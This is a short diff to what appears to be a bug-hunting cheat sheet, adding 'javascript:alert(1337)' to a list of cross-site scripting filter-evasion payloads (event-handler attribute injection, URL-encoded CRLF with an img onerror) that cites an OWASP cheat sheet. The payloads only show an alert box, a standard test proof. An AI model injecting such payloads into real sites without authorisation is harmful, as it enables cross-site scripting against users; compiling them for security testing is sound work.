@@ -29,6 +29,7 @@ https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.ht
 <custom-tag onmouseover='alert(1337)'>
 /?x=y'%09onclick='alert(1337)'%09accessKey='x'
 /?'accesskey='x'onclick='alert(1337)
+javascript:alert(1337)
 y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1337)%3E
 ```
 ![Screenshot from 2024-06-22 21-24-55](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/a4b3b27e-3e78-438e-90c1-38f3986f5a79)
